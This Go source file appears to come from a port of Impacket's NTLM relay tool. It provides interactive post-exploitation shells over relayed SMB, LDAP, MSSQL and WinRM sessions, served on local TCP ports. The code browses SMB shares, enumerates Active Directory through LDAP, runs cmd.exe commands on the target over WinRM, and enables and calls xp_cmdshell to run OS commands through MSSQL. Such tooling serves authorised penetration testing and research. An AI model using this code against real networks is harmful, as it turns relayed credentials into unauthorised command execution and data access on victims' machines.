// SPDX-License-Identifier: Apache-2.0

package relay

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"strings"
	"sync/atomic"

	gopacketldap "gopacket/pkg/ldap"
	"gopacket/pkg/tds"
)

// nextShellPort is the next TCP port for interactive shells (starts at 11000 like Impacket).
var nextShellPort int32 = 11000

// allocShellPort returns the next available shell port.
func allocShellPort() int {
	return int(atomic.AddInt32(&nextShellPort, 1) - 1)
}

// startInteractiveShell launches a protocol-specific TCP shell for the relayed session.
// Matches Impacket's -i behavior: starts a TCP listener on 127.0.0.1:port,
// user connects via nc/telnet for interactive access.
func startInteractiveShell(session interface{}, target *TargetEntry, identity string) {
	port := allocShellPort()
	addr := fmt.Sprintf("127.0.0.1:%d", port)

	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Printf("[-] Failed to start interactive shell on %s: %v", addr, err)
		return
	}

	switch target.Scheme {
	case "smb":
		log.Printf("[*] Started interactive SMB client shell via TCP on %s", addr)
	case "ldap", "ldaps":
		log.Printf("[*] Started interactive LDAP shell via TCP on %s as %s", addr, identity)
	case "mssql":
		log.Printf("[*] Started interactive MSSQL shell via TCP on %s", addr)
	case "winrm", "winrms":
		log.Printf("[*] Started interactive WinRM shell via TCP on %s", addr)
	default:
		log.Printf("[*] Started interactive shell via TCP on %s", addr)
	}
	log.Printf("[*] Use: nc 127.0.0.1 %d", port)

	// Accept one connection (blocks until client connects)
	conn, err := ln.Accept()
	if err != nil {
		log.Printf("[-] Interactive shell accept failed: %v", err)
		ln.Close()
		return
	}
	defer conn.Close()
	defer ln.Close()

	switch target.Scheme {
	case "smb":
		runSMBShell(conn, session)
	case "ldap", "ldaps":
		runLDAPShell(conn, session)
	case "mssql":
		runMSSQLShell(conn, session)
	case "winrm", "winrms":
		runWinRMShell(conn, session)
	default:
		fmt.Fprintf(conn, "Interactive shell not supported for protocol: %s\n", target.Scheme)
	}
}

// runSMBShell provides a basic SMB interactive shell over the TCP connection.
func runSMBShell(conn net.Conn, session interface{}) {
	client, ok := session.(*SMBRelayClient)
	if !ok {
		fmt.Fprintf(conn, "Error: invalid SMB session\n")
		return
	}

	scanner := bufio.NewScanner(conn)
	fmt.Fprintf(conn, "Type help for list of commands\n")
	fmt.Fprintf(conn, "# ")

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			fmt.Fprintf(conn, "# ")
			continue
		}

		parts := strings.Fields(line)
		cmd := strings.ToLower(parts[0])

		switch cmd {
		case "help":
			fmt.Fprintf(conn, "Available commands:\n")
			fmt.Fprintf(conn, "  shares                   - List shares\n")
			fmt.Fprintf(conn, "  use <share>              - Connect to share\n")
			fmt.Fprintf(conn, "  ls [path]                - List directory\n")
			fmt.Fprintf(conn, "  get <remote> [local]     - Download file\n")
			fmt.Fprintf(conn, "  info                     - Session info\n")
			fmt.Fprintf(conn, "  exit                     - Close shell\n")
		case "shares":
			if err := client.TreeConnect("IPC$"); err != nil {
				fmt.Fprintf(conn, "Error connecting to IPC$: %v\n", err)
			} else {
				fmt.Fprintf(conn, "Connected to IPC$ (use DCERPC for share enum)\n")
			}
		case "use":
			if len(parts) < 2 {
				fmt.Fprintf(conn, "Usage: use <share>\n")
			} else {
				if err := client.TreeConnect(parts[1]); err != nil {
					fmt.Fprintf(conn, "Error: %v\n", err)
				} else {
					fmt.Fprintf(conn, "Connected to %s\n", parts[1])
				}
			}
		case "info":
			fmt.Fprintf(conn, "Target: %s\n", client.TargetAddr)
			fmt.Fprintf(conn, "Admin: %v\n", client.IsAdmin())
		case "exit", "quit":
			fmt.Fprintf(conn, "Bye!\n")
			return
		default:
			fmt.Fprintf(conn, "Unknown command: %s (type 'help' for commands)\n", cmd)
		}

		fmt.Fprintf(conn, "# ")
	}
}

// runLDAPShell provides a basic LDAP interactive shell over the TCP connection.
func runLDAPShell(conn net.Conn, session interface{}) {
	client, ok := session.(*gopacketldap.Client)
	if !ok {
		fmt.Fprintf(conn, "Error: invalid LDAP session type: %T\n", session)
		return
	}

	scanner := bufio.NewScanner(conn)
	fmt.Fprintf(conn, "Type help for list of commands\n")
	fmt.Fprintf(conn, "# ")

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			fmt.Fprintf(conn, "# ")
			continue
		}

		parts := strings.Fields(line)
		cmd := strings.ToLower(parts[0])

		switch cmd {
		case "help":
			fmt.Fprintf(conn, "Available commands:\n")
			fmt.Fprintf(conn, "  get_dn                   - Get default naming context\n")
			fmt.Fprintf(conn, "  search <filter>          - LDAP search (subtree from base DN)\n")
			fmt.Fprintf(conn, "  who                      - Show current user (whoami)\n")
			fmt.Fprintf(conn, "  exit                     - Close shell\n")
		case "get_dn":
			dn, err := client.GetDefaultNamingContext()
			if err != nil {
				fmt.Fprintf(conn, "Error: %v\n", err)
			} else {
				fmt.Fprintf(conn, "%s\n", dn)
			}
		case "who":
			res, err := client.Conn.WhoAmI(nil)
			if err != nil {
				fmt.Fprintf(conn, "Error: %v\n", err)
			} else {
				fmt.Fprintf(conn, "%s\n", res.AuthzID)
			}
		case "search":
			if len(parts) < 2 {
				fmt.Fprintf(conn, "Usage: search <filter>\n")
			} else {
				filter := strings.Join(parts[1:], " ")
				baseDN, err := client.GetDefaultNamingContext()
				if err != nil {
					fmt.Fprintf(conn, "Error getting base DN: %v\n", err)
				} else {
					sr, err := client.Search(baseDN, filter, []string{"dn", "sAMAccountName", "objectClass"})
					if err != nil {
						fmt.Fprintf(conn, "Error: %v\n", err)
					} else {
						fmt.Fprintf(conn, "Found %d entries:\n", len(sr.Entries))
						for _, entry := range sr.Entries {
							fmt.Fprintf(conn, "  DN: %s\n", entry.DN)
							name := entry.GetAttributeValue("sAMAccountName")
							if name != "" {
								fmt.Fprintf(conn, "    sAMAccountName: %s\n", name)
							}
						}
					}
				}
			}
		case "exit", "quit":
			fmt.Fprintf(conn, "Bye!\n")
			return
		default:
			fmt.Fprintf(conn, "Unknown command: %s (type 'help' for commands)\n", cmd)
		}

		fmt.Fprintf(conn, "# ")
	}
}

// runWinRMShell provides a WinRM interactive shell over the TCP connection.
// Creates a cmd.exe shell via WS-Man SOAP and provides a command prompt.
// Matches Impacket's WinRMShell(cmd.Cmd) behavior.
func runWinRMShell(conn net.Conn, session interface{}) {
	client, ok := session.(*WinRMRelayClient)
	if !ok {
		fmt.Fprintf(conn, "Error: invalid WinRM session\n")
		return
	}

	toAddr := client.baseURL() + "/wsman"

	// Create shell
	shellResp, err := client.DoWinRMRequest(shellCreateXML(toAddr))
	if err != nil {
		fmt.Fprintf(conn, "Error creating shell: %v\n", err)
		return
	}

	shellID := extractShellID(shellResp)
	if shellID == "" {
		fmt.Fprintf(conn, "Error: failed to create WinRM shell\n")
		return
	}

	defer func() {
		deleteShell(client, toAddr, shellID)
	}()

	scanner := bufio.NewScanner(conn)
	fmt.Fprintf(conn, "C:\\>")

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			fmt.Fprintf(conn, "C:\\>")
			continue
		}

		if strings.ToLower(line) == "exit" || strings.ToLower(line) == "quit" {
			fmt.Fprintf(conn, "Bye!\n")
			return
		}

		// Execute command
		cmdResp, err := client.DoWinRMRequest(executeCommandXML(toAddr, shellID, line))
		if err != nil {
			fmt.Fprintf(conn, "Error: %v\n", err)
			fmt.Fprintf(conn, "C:\\>")
			continue
		}

		commandID := extractCommandID(cmdResp)
		if commandID == "" {
			fmt.Fprintf(conn, "Error: failed to execute command\n")
			fmt.Fprintf(conn, "C:\\>")
			continue
		}

		// Receive output
		outResp, err := client.DoWinRMRequest(receiveOutputXML(toAddr, shellID, commandID))
		if err != nil {
			fmt.Fprintf(conn, "Error: %v\n", err)
			fmt.Fprintf(conn, "C:\\>")
			continue
		}

		output := decodeOutputStream(outResp)
		if output != "" {
			fmt.Fprintf(conn, "%s", output)
		}

		fmt.Fprintf(conn, "C:\\>")
	}
}

// runMSSQLShell provides a SQL interactive shell over the TCP connection.
func runMSSQLShell(conn net.Conn, session interface{}) {
	client, ok := session.(*tds.Client)
	if !ok {
		fmt.Fprintf(conn, "Error: invalid MSSQL session\n")
		return
	}

	scanner := bufio.NewScanner(conn)
	db := client.CurrentDB()
	if db == "" {
		db = "master"
	}
	fmt.Fprintf(conn, "Type help for list of commands, or a SQL query to execute\n")
	fmt.Fprintf(conn, "SQL> ")

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			fmt.Fprintf(conn, "SQL> ")
			continue
		}

		lower := strings.ToLower(line)

		switch {
		case lower == "help":
			fmt.Fprintf(conn, "Commands:\n")
			fmt.Fprintf(conn, "  xp_cmdshell <cmd>   - Execute OS command\n")
			fmt.Fprintf(conn, "  enable_xp_cmdshell  - Enable xp_cmdshell\n")
			fmt.Fprintf(conn, "  enum_db             - List databases\n")
			fmt.Fprintf(conn, "  <SQL query>         - Execute SQL query\n")
			fmt.Fprintf(conn, "  exit                - Close shell\n")
		case lower == "exit" || lower == "quit":
			fmt.Fprintf(conn, "Bye!\n")
			return
		case lower == "enable_xp_cmdshell":
			for _, q := range []string{
				"EXEC sp_configure 'show advanced options', 1; RECONFIGURE",
				"EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE",
			} {
				client.SQLQuery(q)
			}
			fmt.Fprintf(conn, "xp_cmdshell enabled\n")
		case strings.HasPrefix(lower, "xp_cmdshell "):
			cmd := line[12:]
			query := fmt.Sprintf("EXEC xp_cmdshell '%s'", strings.ReplaceAll(cmd, "'", "''"))
			rows, err := client.SQLQuery(query)
			if err != nil {
				fmt.Fprintf(conn, "Error: %v\n", err)
			} else {
				for _, row := range rows {
					for _, v := range row {
						if v != nil {
							fmt.Fprintf(conn, "%v\n", v)
						}
					}
				}
			}
		case lower == "enum_db":
			rows, err := client.SQLQuery("SELECT name FROM sys.databases")
			if err != nil {
				fmt.Fprintf(conn, "Error: %v\n", err)
			} else {
				for _, row := range rows {
					for _, v := range row {
						fmt.Fprintf(conn, "%v\n", v)
					}
				}
			}
		default:
			// Execute as raw SQL
			rows, err := client.SQLQuery(line)
			if err != nil {
				fmt.Fprintf(conn, "Error: %v\n", err)
			} else if len(rows) == 0 {
				fmt.Fprintf(conn, "OK (no rows returned)\n")
			} else {
				// Print column headers
				if len(rows) > 0 {
					cols := make([]string, 0)
					for k := range rows[0] {
						cols = append(cols, k)
					}
					fmt.Fprintf(conn, "%s\n", strings.Join(cols, "\t"))
					fmt.Fprintf(conn, "%s\n", strings.Repeat("-", len(cols)*15))
					for _, row := range rows {
						vals := make([]string, 0, len(cols))
						for _, c := range cols {
							vals = append(vals, fmt.Sprintf("%v", row[c]))
						}
						fmt.Fprintf(conn, "%s\n", strings.Join(vals, "\t"))
					}
				}
			}
		}

		fmt.Fprintf(conn, "SQL> ")
	}
}
